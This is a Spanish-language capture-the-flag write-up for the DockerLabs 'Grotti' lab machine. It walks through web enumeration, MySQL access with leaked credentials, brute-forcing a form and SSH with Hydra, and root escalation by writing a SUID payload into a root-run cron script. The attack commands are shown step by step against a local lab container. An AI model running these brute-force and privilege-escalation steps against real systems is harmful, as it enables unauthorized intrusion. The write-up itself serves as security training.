# DockerLabs - Grotti

Grotti es una máquina DockerLabs orientada a la enumeración web, explotación de bases de datos MySQL y escalada de privilegios.

## Despliegue

```bash
bash auto_deploy.sh grotti.tar
```

## Reconocimiento

Lanzamos un escaneo de red para visualizar los puertos abiertos y versiones:

```bash
nmap -sCV -p- 172.17.0.2
```

Enumeramos directorios del servidor web:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sql,zip,bak -t 50
```

Encontramos dos directorios relevantes:

- `/imagenes` — contenía la contraseña del usuario `rocket`
- `/secret` — página con usuarios administradores y botón para descargar un `.txt` con el comando de acceso a MySQL

## Explotación

### Acceso a MySQL

Con las credenciales obtenidas, accedemos al servicio MySQL del contenedor:

```bash
mysql -u rocket -p -h 172.17.0.2 --ssl=0
```

Dentro encontramos la base de datos `file_secret` con la tabla `rutas`:

```sql
USE file_secret;
SELECT * FROM rutas;
```

| id | nombre     | ruta                              |
|----|------------|-----------------------------------|
| 1  | imagenes   | /var/www/html/files/imagenes/     |
| 2  | documentos | /var/www/html/files/documentos/   |
| 3  | facturas   | /var/www/html/files/facturas/     |
| 4  | secret     | /unprivate/secret                 |

La ruta `/unprivate/secret` es inusual y apunta a algo fuera del webroot estándar.

### Fuerza bruta sobre generate.php

La ruta `/unprivate/secret` contiene un formulario POST (`generate.php`) con dos campos:
- `content` — mensaje de texto
- `number` — número entre 1 y 100

Enumeramos todos los números para detectar respuestas distintas:

```bash
for i in $(seq 1 100); do
  curl -s -X POST http://172.17.0.2/unprivate/secret/generate.php \
    -d "content=test&number=$i" \
    -o "/tmp/grotti_$i.txt"
done
```

El número **16** devuelve datos binarios — un archivo ZIP con una lista de contraseñas.

```bash
curl -s -X POST http://172.17.0.2/unprivate/secret/generate.php \
  -d "content=test&number=16" -o /tmp/grotti_16_raw
unzip /tmp/grotti_16_raw -d /tmp/grotti_passwords/
```

### Fuerza bruta SSH con Hydra

Con los usuarios obtenidos desde `/secret` y la lista de contraseñas del ZIP:

```bash
hydra -l grooti -P /tmp/grotti_passwords/<wordlist> ssh://172.17.0.2 -t 4
```

Credenciales obtenidas: `grooti:YoSoYgRoOt`

### Acceso SSH

```bash
ssh grooti@172.17.0.2
```

## Escalada de privilegios

### Cron Job Hijacking

Buscamos archivos escribibles fuera de rutas habituales:

```bash
find / -writable -type f \
  -not -path "/proc/*" -not -path "/sys/*" \
  -not -path "/dev/*" -not -path "/run/*" \
  -not -path "/tmp/*" -not -path "/home/grooti/*" \
  2>/dev/null
```

Encontramos `/tmp/malicious.sh`, un script ejecutado periódicamente por root vía cron:

```bash
#!/bin/bash
LOG_TEMP="/tmp/mi_log_temporal.log"
echo "Log temporal creado a $(date)" > "$LOG_TEMP"
echo "Archivo $LOG_TEMP creado."
sleep 2
rm -f "$LOG_TEMP"
echo "Archivo $LOG_TEMP eliminado después de 2 segundos."
```

El archivo es escribible por `grooti`. Lo sobrescribimos con un payload que añade el bit SUID a `/bin/bash`:

```bash
echo '#!/bin/bash
chmod u+s /bin/bash' > /tmp/malicious.sh
```

Esperamos a que el cron lo ejecute como root y verificamos:

```bash
ls -la /bin/bash
```

Una vez `/bin/bash` tiene el bit SUID, lanzamos una shell con privilegios de root:

```bash
/bin/bash -p
whoami  # root
```

## Conclusión

Máquina completada. El vector de entrada fue la enumeración web (directorio `/secret` con credenciales MySQL y lista de contraseñas), seguido de fuerza bruta SSH para obtener acceso como `grooti`. La escalada a root se consiguió mediante **cron job hijacking** — un script en `/tmp/` ejecutado por root era escribible por el usuario, permitiendo inyectar un payload arbitrario.
